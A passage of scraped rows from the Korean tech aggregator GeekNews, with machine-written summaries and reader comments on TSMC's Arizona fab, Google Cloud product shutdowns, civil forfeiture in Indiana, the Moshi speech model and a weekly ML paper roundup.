     * 삼성, 인텔 등 경쟁사들도 미국 내 팹 건설을 검토 중인 만큼, 앞으로 미국이 글로벌 반도체 공급망에서 차지하는 비중이 더욱 높아질 전망임

   GN+ 의견 중에 이해가 안되는 문장이 있습니다. 가격이 비싸더라도 다른 경쟁력이 미국 생산 칩에 있다는 건가요?
     * 다만 TSMC 입장에서는 대만에 비해 인건비, 전력비 등 생산 비용이 높아질 수 밖에 없음
          + 애리조나산 칩의 가격이 대만산에 비해 높아질 가능성이 있음
          + 장기적으로는 대만 공장의 경쟁력 약화로 이어질 수 있음

   양안 전쟁이 터져도 애리조나 공장은 돌릴 수 있으니까요.

   미국 기업 입장에서는 리스크를 고려할 때 가격이 조금 더 나가더라도 미국내에서 생산된 칩을 선호할 가능성이 있고, 장기적으로 미국내에서 생산하는 칩 비용도 낮아져 간격이 줄어든다면 대만 공장 경쟁력이 낮아질 수 있다고 봅니다.

   설명해 주셔서 감사합니다. 아마 비슷한 이유로 완성품 공장도 미국에 생길 수 있겠네요. 완성품 생산의 리스크를 줄이고 중간 생산품에 대한 물류비를 절감하려는 시도가 있을 수도 있겠습니다

        Hacker News 의견

     * 미국의 산업 정책이 성공적으로 작동하여 TSMC의 지식을 미국 노동력으로 이전함
          + 미국 제조업이 부흥할 것이며, 칩과 에너지 안보를 위해 미래를 스스로 구축할 것임
          + 이는 좋은 소식이며 축하할 만한 일임
     * Bloomberg 또는 NYT에서 미국 노동자들이 대만식 작업 방식에 적응하는 데 어려움을 겪고 있다는 기사를 읽은 적이 있음
          + 이는 공장의 전체 성공에 영향을 미칠 수 있음
          + 그러나 이것이 사실인지 확실하지 않음
     * TSMC에 경의를 표함
          + 복잡한 프로세스를 가진 새로운 공장을 가동하는 것은 매우 어려운 일임
     * iPhone 14 Pro, 14 Pro Max, 15 및 15 Plus에 사용되는 일부 프로세서가 미국에서 TSMC에 의해 제조되고 있음
     * 예상보다 훨씬 좋은 소식이며, 더 빨리 이루어짐
          + Intel 외에 미국에서 ~4nm 노드 웨이퍼를 제조하는 다른 회사가 있는지 궁금함
          + nm 측정 사용의 오해에 대해 알고 있음
     * 공급망 공격에 대한 이점이 무엇인지 궁금함
          + Apple이 이를 감지하지 못한 채 칩 설계에 백도어를 구현할 수 있는지 궁금함
          + Apple이 제조된 칩이 원래 설계와 일치하는지 확인하는 검증 메커니즘이 있을 것으로 예상함
     * TSMC의 성공이 고급 기술 제조 요구에 부합하는 기술력을 공급하는 인력 구조와 관련이 있는지 궁금함
          + 대만은 많은 대학원 졸업자와 직업/기술 교육을 받은 노동 계층을 보유하고 있음
          + 미국은 같은 기준으로 시간이 지남에 따라 어떻게 하고 있는지 궁금함
     * 이는 국가 안보가 손상되지 않도록 하는 데 큰 도움이 될 것임
          + TSMC 수준의 대량 생산이 필요하지 않으며, 대만 외의 많은 기업이 위험을 분산시킬 수 있음
          + 최신 기술이 미국 내에 있어야 하며, TSMC와 Samsung이 2-3년 내에 이를 제공할 것임
     * 이는 미국에 좋은 소식이며, 대만에는 지정학적으로 나쁜 소식임
     * TSMC 미국 공장에서 제조된 칩의 비용이 TSMC 대만 공장에서 제조된 칩의 비용과 어떻게 다른지 궁금함
"
"https://news.hada.io/topic?id=16893","Google Cloud를 추천하기는 어렵습니다","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Google Cloud를 추천하기는 어렵습니다

Google Cloud 추천이 어려운 이유

     * Google Domains
          + 1년 전, Google이 Google Domains를 종료하기로 결정한 후 도메인을 이전해야 했음
          + 새로운 도메인 등록 기관에서 여러 사이드 프로젝트의 서브 도메인 매핑을 다시 설정하고, 도메인을 다시 검증하고 Google Cloud Run에서 매핑을 재생성해야 했음
     * Google Container Registry
          + Google Container Registry는 2025년에 종료될 예정이며, Artifact Registry라는 새로운 프로젝트로 대체됨
          + Container Registry가 종료되는 이유는 아마도 Artifact Registry가 10배 더 저렴하기 때문일 것임
          + 여러 사이드 프로젝트를 GCR에서 GAR로 이전하는 데 여러 시간이 소요되었음
          + 일부 프로젝트는 몇 년 전에 배포되어 완벽하게 작동하고 있으며, 다른 일부는 단일 페이지 홈페이지임
          + 두 번의 이전 작업은 매우 힘들었음
          + Google Cloud는 많은 노력을 요구했지만, 이러한 이전 작업에서 얻은 이점은 거의 없었음

Google Cloud - 훌륭한 엔지니어링, 좋은 제품, 끔찍한 전략

     * Google Cloud가 AWS와 Microsoft Azure보다 우수한 제품이라고 강하게 믿음
     * UX가 훨씬 간단하고, AWS에 비해 기본 요소들이 더 발전되어 있음
     * 신뢰성은 AWS만큼 높지는 않지만 매우 가까움
     * 그러나 지속적인 변화로 인해 추천하기 어려움

GN⁺의 정리

     * Google Cloud는 뛰어난 엔지니어링과 좋은 제품을 제공하지만, 지속적인 변화로 인해 사용자에게 큰 불편을 초래함
     * Google Domains와 Google Container Registry의 종료는 사용자에게 많은 시간과 노력을 요구하며, 그 과정에서 얻는 이점은 거의 없음
     * Google Cloud의 UX와 기본 요소는 AWS보다 우수하지만, 빈번한 변화로 인해 안정성이 떨어질 수 있음
     * Google Cloud를 사용하는 데 있어 이러한 문제를 고려해야 함

   gae는 폐급입니다

   도메인 서비스 초기부터 사용하고 있었는데 갖다버리는 것 보고 구글은 다시는 안써야지 싶었습니다.

   다른 클라우드는 서포트도 적극적이고 할인도 많이 해주는데 구글 클라우드는 목이 엄청 뻣뻣(?)하더군요. 한번 써보고 다시는 안쓰기로 했습니다.

   저도 비슷하게 3개사 다 써보면 회사마다 특징이 있더라고요
     * AWS는 직원분 또는 MSP 쪽 직원분 1명이 회사로 찾아옴
     * Azure는 직원분 2명 정도와 연결된 MSP 직원 2명 이렇게 해서 4명 정도옴 (좋은데 부담)
     * GCP는 아무도 안 옴.

   좀 쎄게 이야기하면 요즘 구글 제품에 대한 엔지니어링적 신뢰도가 예전같지 않습니다.
   GCP로 새 제품 개발중인 상황에서 하루에도 몇번씩 체감합니다.

   구글 도메인 종료가 좀 치명적이긴 했죠.. 구글 제품에 대한 신뢰가 조금씩 깨지고 있는 느낌이에요.

   그래도 클라우드 플랫폼 자체는 aws보단 gcp가 좀 더 사용하기 쉽다고 생각해요. ux나 문서가 훨씬 친절하다고 느껴졌거든요.

   구글은 왜 이런 쓸모 없는 짓을...

   저자 의견에 완전 동의합니다.
   예전에 구글 앱 엔진에서 엄청 데이면서 고생한 거 생각하면 아직도 짜증이 ㅠ
   구글 도메인 운영을 Squarespace 로 넘긴건 정말 결정타 였어요.
   저도 모든 도메인이 구글 도메인에 있는지라 현재는 그냥 두고는 있는데, 언제 다 옮겨가야 할듯

        Hacker News 의견

     * Google Domains의 종료는 큰 실수였음
          + 손실을 감수하고라도 계속 운영했어야 했음
          + DNS 관련 서비스 종료는 인프라 운영자들에게 불안감을 줌
     * Google의 문제는 항상 고객 지원이었음
          + 고객이 제품을 사용할 때 지원받을 자격이 있다는 개념 부족
          + 명확하고 직관적인 마이그레이션 흐름이 필요함
     * Australian UniSuper 사건을 잊지 말아야 함
          + Google Cloud의 잘못된 설정으로 계정이 삭제됨
          + 50만 명 이상의 UniSuper 회원이 일주일 동안 계정 접근 불가
     * Google에 대한 부정적인 의견이 많아 놀라움
          + 고객 지원과 예고 없는 제품 종료는 싫지만, 클라우드 인터페이스는 사용하기 쉬움
          + Azure는 자주 중단되었고, AWS는 신뢰성은 좋지만 UX는 별로임
          + GCP를 추천함, 제품 종료가 큰 영향을 주지 않았음
     * Dialogueflow 평가 중 실망스러운 경험
          + 판매팀과의 채팅이 가상 가이드로만 이루어짐
          + 결국 streamlit 사용
     * Google Play 개발자 검증 문제로 신뢰 상실
          + 전화번호 확인 불가로 계정 위험
          + 지원 봇이 쓸모없음
     * GCP 아키텍처 설계 중 Google IoT 서비스 종료 발견
          + AWS로 추천 변경
     * Google의 인프라 불안정성에 대한 비유
          + ""구글의 변덕스러운 인프라 위에 집을 지은 어리석은 사람""
     * Google Domains 종료로 신뢰 상실
          + 중요한 인프라 계층이 쉽게 종료될 줄 몰랐음
     * AWS가 최근 가장 나은 선택으로 느껴짐
          + 도메인 등록은 AWS가 가장 잘함
          + Azure는 GoDaddy를 사용하고, 잠금 서비스 강요
          + Route53이 도메인과 DNS 관리에 대한 신뢰를 줌
"
"https://news.hada.io/topic?id=16819","인디애나 경찰, 현금이 든 FedEx 소포 압수","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       인디애나 경찰, 현금이 든 FedEx 소포 압수

     * indystar.com은 모든 독자들에게 최상의 경험을 제공하기 위해 최신 기술을 활용하여 사이트를 구축함
     * 사이트를 더 빠르고 쉽게 사용할 수 있도록 설계함
     * 현재 사용 중인 브라우저는 지원되지 않음
     * indystar.com을 최적의 상태로 이용하려면 다음 브라우저 중 하나를 다운로드할 것을 권장함
          + Google Chrome
          + Mozilla Firefox
          + Opera
          + Microsoft Edge
          + Safari

GN⁺의 정리

     * indystar.com은 최신 기술을 활용하여 사용자 경험을 향상시키고자 함
     * 지원되지 않는 브라우저를 사용하는 경우 사이트 이용에 제한이 있을 수 있음
     * 최신 브라우저를 사용하면 더 빠르고 원활한 웹 서핑 경험을 제공받을 수 있음
     * 기술 발전에 따라 웹사이트도 지속적으로 업데이트되고 있음

        Hacker News 의견

     * 국가가 승인한 폭력 조직이 책임을 지지 않고 민간인에게서 훔치는 행위에 대한 비판
     * 민사 몰수 제도가 고대 법률인 'deodand'와 유사하다는 의견
          + 'deodand'는 사망에 책임이 있는 물건을 몰수하는 제도였음
          + 이 제도는 소유자의 잘못과 상관없이 물건을 몰수했으며, 종종 가족을 빈곤하게 만듦
          + 시간이 지나면서 재정적 인센티브가 시스템에 스며들었음
          + 결국 'deodand'는 영국에서 사라졌지만, 유사한 제도가 현대에 다시 등장한 것 같음
     * 민사 몰수는 비문명적이며 불법이어야 한다는 주장
     * FedEx 허브는 사유지인데 경찰이 왜 거기 있는지 의문
     * 경찰이 물건을 훔치는 이유는 그들이 할 수 있기 때문이라는 주장
          + 플로리다에서는 혐의 없이도 차량을 압수하는 사례가 있음
          + 대통령과 대법원이 신경 쓰지 않기 때문에 경찰의 행동에 제한이 없다는 우려
     * 대법원이 민사 몰수를 위헌으로 판결하지 않은 이유에 대한 의문
     * Institute for Justice와 협력하여 불법적인 패키지 압수에 대한 소송을 제기한 사례
          + Institute for Justice는 민권에 중점을 둔 비영리 단체로, 그들의 사명이 공감된다면 지원을 권장함
          + 최근 사례들:
               o 플로리다의 배양육 금지에 대한 소송
               o 도시가 20만 달러 이상을 지불해야 한다는 판결을 받았지만 다시 소송을 제기해야 하는 사례
               o 10년 가까이 법정에서 싸우고 있는 여성의 소송을 진행시키기 위한 새로운 청원
               o 정치적 반대자의 집을 불법으로 급습한 것에 대한 책임을 묻는 소송
               o 약물 남용 상담사로 일하는 것을 영구적으로 금지하는 처벌에 도전하는 버지니아 여성의 사례
               o 잘못된 집을 급습한 SWAT 팀의 책임을 묻는 가족의 소송
     * 다양한 정치적 스펙트럼의 조직에 기부를 통해 경찰의 행동을 테스트하는 방법 제안
     * 현금과 그 이동이 언론만큼 신성시되는 미국이 가능할지에 대한 논의
          + 현금을 사용하는 이유는 추적되지 않기 위해서임
          + 현금은 사회적으로 용인되지 않는 경계에 있는 커뮤니티에게 중요한 도구임
          + 민사 자산 몰수는 소외된 사람들에 대한 공격이라는 주장
     * 경찰이 장갑차를 강탈하는 관련 뉴스 소개
"
"https://news.hada.io/topic?id=16840","모시: 실시간 대화를 위한 음성-텍스트 기반 모델","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      모시: 실시간 대화를 위한 음성-텍스트 기반 모델

Moshi: 실시간 대화를 위한 음성-텍스트 기반 모델

  Moshi 소개

     * Moshi는 실시간 대화를 위한 음성-텍스트 기반 모델이자 양방향 음성 대화 프레임워크임
     * 최첨단 스트리밍 신경 오디오 코덱인 Mimi를 사용함
     * Mimi는 24 kHz 오디오를 12.5 Hz로 변환하며, 대역폭은 1.1 kbps로 유지하면서도 80ms의 지연 시간으로 스트리밍 방식으로 처리함
     * 기존의 비스트리밍 코덱인 SpeechTokenizer(50Hz, 4kbps)나 SemantiCodec(50Hz, 1.3kbps)보다 성능이 뛰어남

  Moshi의 작동 방식

     * Moshi는 두 개의 오디오 스트림을 모델링함: 하나는 Moshi, 다른 하나는 사용자
     * 추론 시, 사용자의 스트림은 오디오 입력에서 가져오고, Moshi의 스트림은 모델의 출력에서 샘플링됨
     * 이 두 오디오 스트림과 함께, Moshi는 자신의 음성에 해당하는 텍스트 토큰을 예측함
     * 작은 Depth Transformer가 주어진 시간 단계에서 코드북 간의 종속성을 모델링하고, 큰 7B 파라미터 Temporal Transformer가 시간적 종속성을 모델링함
     * Moshi는 이론적으로 160ms의 지연 시간을 달성하며, 실제로는 L4 GPU에서 200ms 이하의 지연 시간을 가짐

  Mimi의 특징

     * Mimi는 SoundStream과 EnCodec 같은 이전 신경 오디오 코덱을 기반으로 하며, 인코더와 디코더에 Transformer를 추가함
     * Mimi는 텍스트 토큰의 평균 프레임 속도(~3-4 Hz)에 더 가깝게 맞추기 위해 스트라이드를 조정함
     * Mimi는 WavLM의 자가 지도 표현과 일치하도록 첫 번째 코드북 토큰을 맞추는 증류 손실을 사용함
     * Mimi는 적대적 훈련 손실과 기능 매칭만을 사용하여 낮은 비트레이트에도 주관적 품질에서 큰 개선을 보임

  저장소 구성

     * 이 저장소에는 세 가지 버전의 Moshi 추론 스택이 있음
          + PyTorch를 사용하는 Python 버전은 moshi/ 디렉토리에 있음
          + M 시리즈 Mac을 위한 MLX를 사용하는 Python 버전은 moshi_mlx/ 디렉토리에 있음
          + 프로덕션에서 사용되는 Rust 버전은 rust/ 디렉토리에 있음
     * 라이브 데모 코드는 client/ 디렉토리에 제공됨

  모델

     * 세 가지 모델을 공개함
          + 음성 코덱 Mimi
          + 남성 합성 음성으로 미세 조정된 Moshi (Moshiko)
          + 여성 합성 음성으로 미세 조정된 Moshi (Moshika)
     * 각 모델은 HuggingFace 저장소에서 제공됨
     * 모든 모델은 CC-BY 4.0 라이선스로 공개됨

  요구 사항

     * 최소 Python 3.10이 필요하며, Python 3.12를 권장함
     * 특정 요구 사항은 각 백엔드 디렉토리를 참조
     * PyTorch 및 MLX 클라이언트 설치 명령어 제공

  Python (PyTorch)

     * PyTorch 기반 API는 moshi 디렉토리에 있음
     * 스트리밍 오디오 토크나이저(mimi)와 언어 모델(moshi)을 제공함
     * 인터랙티브 모드에서 실행하려면 서버를 시작해야 함

  Python (MLX) for macOS

     * moshi_mlx를 설치한 후 로컬 추론을 실행할 수 있음
     * 명령줄 인터페이스는 기본적이며, 에코 취소 기능이 없음

  Rust

     * Rust 추론 서버를 실행하려면 rust 디렉토리에서 명령어를 사용
     * macOS에서는 --features cuda 대신 --features metal을 사용할 수 있음

  클라이언트

     * 웹 UI 사용을 권장하며, 추가적인 에코 취소 기능을 제공함
     * 명령줄 인터페이스도 제공됨

  개발

     * 저장소를 클론하여 설치하고 개발할 수 있음

  FAQ

     * 문제를 열기 전에 자주 묻는 질문 섹션을 확인

  라이선스

     * Python 부분은 MIT 라이선스, Rust 백엔드는 Apache 라이선스
     * 웹 클라이언트 코드는 MIT 라이선스
     * 모델 가중치는 CC-BY 4.0 라이선스

  인용

     * Mimi 또는 Moshi를 사용할 경우, 논문을 인용

GN⁺의 정리

     * Moshi는 실시간 대화를 위한 혁신적인 음성-텍스트 모델로, 낮은 지연 시간과 높은 품질을 자랑함
     * Mimi 코덱은 기존 코덱보다 효율적이며, Transformer를 통해 성능을 극대화함
     * 다양한 플랫폼에서 사용 가능하며, PyTorch, MLX, Rust 등 여러 버전을 제공함
     * 실시간 대화 애플리케이션 개발자에게 매우 유용하며, 특히 낮은 지연 시간이 중요한 경우에 적합함
     * 유사한 기능을 가진 다른 프로젝트로는 Google의 WaveNet과 OpenAI의 Jukebox가 있음

        Hacker News 의견

     * 첫 번째 의견
          + 지연 시간이 매우 짧아 오픈 소스 모델로서는 큰 성과임
          + 최근 매우 우수한 LLM들에 비해 응답 품질이 떨어짐
          + 2019년의 LLM을 연상케 함
          + 오디오 측면에서는 충분히 잘했으나, 응답 품질에 더 집중해야 함
     * 두 번째 의견
          + YouTube에서 몇 달 전의 재미있는 데모를 발견함
          + 지금은 개선되었을 것이라고 확신함
     * 세 번째 의견
          + 실시간 음성 -> LLM -> 음성 출력 솔루션을 개발 중임
          + 스트리밍 신경 오디오 코덱이 가장 흥미로움
          + 제품 관점에서는 LLM에 바로 연결하기보다는 도구/기능 호출 단계가 필요함
          + tincans 개발이 종료되었지만, 이 방향으로의 발전 가능성이 큼
     * 네 번째 의견
          + Moshi는 CC-BY 라이선스임
          + 최근 Apache v2로 출시된 유사한 7b 모델이 있음
     * 다섯 번째 의견
          + iPad의 a-shell 터미널에서 TTS 인터페이스를 제공하는 편리한 방법이 있는지 궁금함
     * 여섯 번째 의견
          + 최근 음성 지원 LM 분야에서 많은 발전이 있었음
          + 관련 프로젝트로 LLaMA-Omni와 mini-omni가 있음
     * 일곱 번째 의견
          + 추론 서버는 Rust로 작성되었고, huggingface의 Candle crate를 사용함
          + Moshi 저자 중 한 명이 Candle의 주요 저자임
          + Candle을 기반으로 한 추론 스택을 구축 중임
     * 여덟 번째 의견
          + 사용해본 결과, 즉시 응답하지만 실제 질문에 대한 답변은 나중에 제공됨
          + 때로는 루프에 빠질 수 있음
     * 아홉 번째 의견
          + 지연 시간이 약 200ms로 매우 짧음
          + 7B 트랜스포머 모델을 사용하여 매우 똑똑하지는 않음
          + 더 큰 모델을 사용하면 지연 시간이 길어질 수 있음
          + 시스템 아키텍처에서 중간 단계의 응답을 제공하는 방법이 필요함
     * 열 번째 의견
          + 응답 속도는 인상적이나, 응답의 품질은 그렇지 않음
          + Moshi와의 대화 예시를 제공함
          + ""2019년""이라는 잘못된 응답을 제공함
          + COVID-19에 대한 잘못된 정보를 제공함
"
"https://news.hada.io/topic?id=16883","[2024/09/16 ~ 09/22] 이번 주의 주요 ML 논문 (Top ML Papers of the Week)","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    [2024/09/16 ~ 09/22] 이번 주의 주요 ML 논문 (Top ML Papers of the Week)

     * DAIR.AI에서 매주 공개하는 ML 논문들에 대한 글을 자동 번역해보았습니다.
     * 이번 주에 선정된 논문들을 살펴보면 몇 가지 두드러진 경향을 포착할 수 있습니다. 첫째, 대규모 언어 모델(LLM)에 관한 연구가 많은 비중을 차지하고 있습니다. 'Training LLMs to Self-Correct via RL', 'Qwen2.5 Coder', 'A Comprehensive Evaluation of Quantized Instruction-Tuned LLMs' 등 다양한 논문들이 LLM의 성능 향상 및 응용에 대해 다루고 있습니다. 이는 LLM이 현재 AI 연구의 핵심 주제 중 하나임을 반영합니다.
     * 둘째, 인공지능의 사고 과정과 관련된 연구가 많습니다. 'Diagram of Thought (DoT)', 'Iteration of Thought', 'To CoT or not to CoT?'와 같은 논문들은 AI의 사고 방식이나 추론 과정에 대해 깊이 있게 탐구하고 있습니다. 이를 통해 AI 시스템의 정확도와 효율성을 높이려는 노력이 엿보입니다.
     * 이러한 경향이 나타나는 이유는 몇 가지로 분석될 수 있습니다. 먼저, 대규모 언어 모델은 다양한 응용 가능성과 높은 성능 때문에 산업 및 학계에서 큰 관심을 받고 있기 때문입니다. 특히, 모델의 자가 수정 능력이나 성능 개선을 위한 다양한 기법들이 활발히 연구되고 있습니다. 또한, AI의 사고 과정에 대한 연구는 인간과 유사한 사고 능력을 가진 AI를 개발하려는 궁극적인 목표와 관련이 있습니다. 이는 더 복잡하고 지능적인 작업을 자동화하는 데 있어 필수적인 요소로 여겨지고 있습니다.
     * 요약하면, 이번 주 논문들의 주요 트렌드는 대규모 언어 모델의 성능 향상 및 AI의 사고 과정 연구라고 할 수 있습니다. 이는 현재 AI 연구가 어떤 방향으로 발전하고 있는지를 잘 보여주는 사례입니다.


  Moshi

    논문 소개

   음성 텍스트 기반 모델과 전이중 음성 대화 프레임워크, 시스템의 여러 구성 요소, 7B 파라미터 텍스트 LLM인 Helium, 오디오 품질에 대한 최첨단 성능을 갖춘 의미 음향 신경 오디오 코드인 Mimi, 음성 대 음성 방식으로 임의의 대화를 생성할 수 있는 계층적 멀티스트림 아키텍처에 대해 소개합니다.

     Introduces a speech-text foundation model and full-duplex spoken dialogue framework; they present several components of the systems; Helium is a 7B parameter text LLM; Mimi is a semantic-acoustic neural audio code with state-of-the-art performance on audio quality; a hierarchical multi-stream architecture that can generate arbitrary conversation in a speech-to-speech manner.

    논문 초록(Abstract)

   음성-텍스트 기반 모델이자 전이중 음성 대화 프레임워크인 Moshi를 소개합니다. 현재 음성 대화를 위한 시스템은 음성 활동 감지, 음성 인식, 텍스트 대화 및 텍스트 음성 변환과 같은 독립적인 구성 요소의 파이프라인에 의존합니다. 이러한 프레임워크는 실제 대화의 경험을 모방할 수 없습니다. 첫째, 복잡성으로 인해 상호 작용 사이에 몇 초의 지연 시간이 발생합니다. 둘째, 텍스트는 대화의 중간 양식이기 때문에 감정이나 비언어적 소리와 같이 의미를 수정하는 비언어적 정보가 상호작용에서 손실됩니다. 마지막으로, 겹치는 말, 중단 및 감탄사를 고려하지 않는 화자 차례로 분할하는 방식에 의존합니다. Moshi는 음성 대화를 음성 대 음성 생성으로 캐스팅하여 이러한 독립적인 문제를 모두 해결합니다. 텍스트 언어 모델 백본에서 시작하는 Moshi는 신경
   오디오 코덱의 잔여 양자화기에서 음성을 토큰으로 생성하는 동시에 자신의 음성과 사용자의 음성을 병렬 스트림으로 분리하여 모델링합니다. 이를 통해 명시적인 화자 전환을 제거하고 임의의 대화 역학을 모델링할 수 있습니다. 또한 이전 작업의 계층적 시맨틱-음향 토큰 생성을 확장하여 오디오 토큰의 접두사로 시간 정렬 텍스트 토큰을 먼저 예측합니다. 이 '내부 독백' 방식은 생성된 음성의 언어 품질을 크게 향상시킬 뿐만 아니라 스트리밍 음성 인식과 텍스트 음성 변환을 제공하는 방법도 보여줍니다. 이 결과물은 이론상 160ms, 실제 200ms의 지연 시간을 가진 최초의 실시간 전이중 음성 대용량 언어 모델이며, github.com/kyutai-labs/moshi 에서 확인할 수 있습니다.

     We introduce Moshi, a speech-text foundation model and full-duplex spoken dialogue framework. Current systems for spoken dialogue rely on pipelines of independent components, namely voice activity detection, speech recognition, textual dialogue and text-to-speech. Such frameworks cannot emulate the experience of real conversations. First, their complexity induces a latency of several seconds between interactions. Second, text being the intermediate modality for dialogue, non-linguistic information that modifies meaning— such as emotion or non-speech sounds— is lost in the interaction. Finally, they rely on a segmentation into speaker turns, which does not take into account overlapping speech, interruptions and interjections. Moshi solves these independent issues altogether by casting spoken dialogue as speech-to-speech generation. Starting from a text language model backbone, Moshi generates speech as tokens from the residual quantizer of a neural audio codec, while
     modeling separately its own speech and that of the user into parallel streams. This allows for the removal of explicit speaker turns, and the modeling of arbitrary conversational dynamics. We moreover extend the hierarchical semantic-to-acoustic token generation of previous work to first predict time-aligned text tokens as a prefix to audio tokens. Not only this “Inner Monologue” method significantly improves the linguistic quality of generated speech, but we also illustrate how it can provide streaming speech recognition and text-to-speech. Our resulting model is the first real-time full-duplex spoken large language model, with a theoretical latency of 160ms, 200ms in practice, and is available at github.com/kyutai-labs/moshi.

    논문 링크

   https://kyutai.org/Moshi.pdf

    더 읽어보기

   https://github.com/kyutai-labs/moshi

   https://x.com/kyutai_labs/status/1836427396959932492


  강화 학습을 통해 언어 모델이 스스로 수정하도록 훈련하기 / Training Language Models to Self-Correct via Reinforcement Learning

    논문 소개

   LLM의 자가 교정 기능을 개선하기 위해 멀티턴 온라인 강화 학습을 개발, 전적으로 자체 생성 데이터에 기반, SFT는 자가 교정 학습에 비효율적이며 훈련 데이터와 모델 응답 간의 분포 불일치로 어려움을 겪는 것으로 나타남, 먼저 교정 행동을 최적화한 다음 보상 보너스를 사용해 훈련 중 자가 교정 기능을 증폭하는 2단계 접근 방식 제안, Gemini 1에 적용했을 때.0 Pro 및 1.5 플래시 모델에 적용하면 MATH 및 HumanEval 벤치마크에서 기본 모델의 자가 보정 성능을 각각 15.6%와 9.1% 향상시키는 최첨단 자가 보정 성능을 달성할 수 있습니다.

     Develops a multi-turn online reinforcement learning to improve the capabilities of an LLM to self-correct; it’s based entirely on self-generated data; SFT is shown to be ineffective at learning self-correction and suffers from distribution mismatch between training data and model responses; proposes a two-stage approach that first optimizes correction behavior and then uses a reward bonus to amplify self-correction during training; when applied to Gemini 1.0 Pro and 1.5 Flash models, it achieves state-of-the-art self-correction performance, improving the base models’ self-correction by 15.6% and 9.1% respectively on the MATH and HumanEval benchmarks.

    논문 초록(Abstract)

   자가 교정은 대규모 언어 모델(LLM)의 매우 바람직한 기능이지만, 최신 LLM에서는 그 효과가 거의 없는 것으로 지속적으로 밝혀져 왔습니다. 자가 교정 학습을 위한 기존의 접근 방식은 여러 모델을 필요로 하거나 더 뛰어난 성능의 모델 또는 다른 형태의 감독에 의존합니다. 이를 위해 유니티는 전적으로 자체 생성된 데이터를 사용해 LLM의 자가 수정 능력을 크게 향상시키는 멀티턴 온라인 강화 학습(RL) 접근 방식인 SCoRe를 개발했습니다. SCoRe를 구축하기 위해 먼저 오프라인 모델 생성 보정 트레이스에 대한 감독 미세 조정(SFT)의 변형이 자가 보정 동작을 주입하는 데 불충분하다는 것을 보여줍니다. 특히, SFT를 통한 훈련은 훈련 데이터와 모델 자체의 반응 사이에 분포 불일치가 발생하거나 테스트 시점에 효과적이지 않은 특정 보정 동작 모드만을 암묵적으로
   선호한다는 사실을 관찰했습니다. SCoRe는 모델 자체적으로 생성된 보정 트레이스의 분포에 따라 학습하고 적절한 정규화를 사용하여 주어진 프롬프트에 대해 단순히 보상이 높은 응답을 맞추는 대신 테스트 시점에 효과적인 자가 보정 전략을 학습하도록 학습 프로세스를 조정함으로써 이러한 문제를 해결합니다. 이 정규화는 기본 모델에서 RL의 첫 번째 단계를 실행하여 붕괴에 덜 취약한 정책 초기화를 생성한 다음 보상 보너스를 사용하여 훈련 중에 자기 교정을 증폭시키는 것을 규정합니다. Gemini 1.0 Pro 및 1.5 플래시 모델에 적용한 결과, SCoRe는 MATH 및 HumanEval 벤치마크에서 기본 모델의 자가 보정 성능을 각각 15.6%와 9.1% 향상시키며 최첨단 자가 보정 성능을 달성하는 것으로 나타났습니다.

     Self-correction is a highly desirable capability of large language models (LLMs), yet it has consistently been found to be largely ineffective in modern LLMs. Existing approaches for training self-correction either require multiple models or rely on a more capable model or other forms of supervision. To this end, we develop a multi-turn online reinforcement learning (RL) approach, SCoRe, that significantly improves an LLM's self-correction ability using entirely self-generated data. To build SCoRe, we first show that variants of supervised fine-tuning (SFT) on offline model-generated correction traces are insufficient for instilling self-correction behavior. In particular, we observe that training via SFT either suffers from a distribution mismatch between the training data and the model's own responses or implicitly prefers only a certain mode of correction behavior that is often not effective at test time. SCoRe addresses these challenges by training under the model's own
     distribution of self-generated correction traces and using appropriate regularization to steer the learning process into learning a self-correction strategy that is effective at test time as opposed to simply fitting high-reward responses for a given prompt. This regularization prescribes running a first phase of RL on a base model to generate a policy initialization that is less susceptible to collapse and then using a reward bonus to amplify self-correction during training. When applied to Gemini 1.0 Pro and 1.5 Flash models, we find that SCoRe achieves state-of-the-art self-correction performance, improving the base models' self-correction by 15.6% and 9.1% respectively on the MATH and HumanEval benchmarks.

    논문 링크

   https://arxiv.org/abs/2409.12917

    더 읽어보기

   https://x.com/omarsar0/status/1837228446839361984


  Qwen2.5-Coder 기술 문서 / Qwen2.5-Coder Technical Report

    논문 소개

   15억 개와 7억 개의 파라미터를 포함한 일련의 모델, 5조 5천억 개의 토큰으로 지속적으로 사전 학습된 Qwen2.5 아키텍처를 기반으로 구축되었으며, 10개 이상의 벤치마크에서 최첨단 성능을 달성하고 코드 생성, 완성, 추론 및 복구에 강력한 기능을 포함합니다.

     A series of models including 1.5B and 7B parameters; it’s built upon the Qwen2.5 architecture which is continuously pretrained on 5.5 trillion tokens; achieves state-of-the-art performance across more than 10 benchmarks; includes strong capabilities in code generation, completion, reasoning, and repairing.

    논문 초록(Abstract)

   이 보고서에서는 이전 버전인 CodeQwen1.5에서 크게 업그레이드된 Qwen2.5-Coder 시리즈를 소개합니다. 이 시리즈에는 두 가지 모델이 있습니다: Qwen2.5-Coder-1.5B와 Qwen2.5-Coder-7B입니다. 코드 전용 모델인 Qwen2.5-Coder는 Qwen2.5 아키텍처를 기반으로 구축되었으며 5조 5천억 개 이상의 토큰으로 구성된 방대한 코퍼스에 대한 사전 학습을 계속합니다. 세심한 데이터 정리, 확장 가능한 합성 데이터 생성, 균형 잡힌 데이터 믹싱을 통해 Qwen2.5-Coder는 일반적인 범용성을 유지하면서 인상적인 코드 생성 기능을 보여줍니다. 이 모델은 코드 생성, 완성, 추론, 복구 등 10개 이상의 벤치마크에서 최고 수준의 성능을 달성하며 동일한 모델 크기의 대형 모델을 지속적으로 능가하는 광범위한 코드 관련 작업에서 평가되었습니다. 유니티는 Qwen2.5-Coder 시리즈의 출시가 코드 인텔리전스
   연구의 지평을 넓힐 뿐만 아니라 포괄적인 라이선스를 통해 개발자들이 실제 애플리케이션에서 더 폭넓게 채택하도록 장려할 것으로 믿습니다.

     In this report, we introduce the Qwen2.5-Coder series, a significant upgrade from its predecessor, CodeQwen1.5. This series includes two models: Qwen2.5-Coder-1.5B and Qwen2.5-Coder-7B. As a code-specific model, Qwen2.5-Coder is built upon the Qwen2.5 architecture and continues pretrained on a vast corpus of over 5.5 trillion tokens. Through meticulous data cleaning, scalable synthetic data generation, and balanced data mixing, Qwen2.5-Coder demonstrates impressive code generation capabilities while retaining general versatility. The model has been evaluated on a wide range of code-related tasks, achieving state-of-the-art (SOTA) performance across more than 10 benchmarks, including code generation, completion, reasoning, and repair, consistently 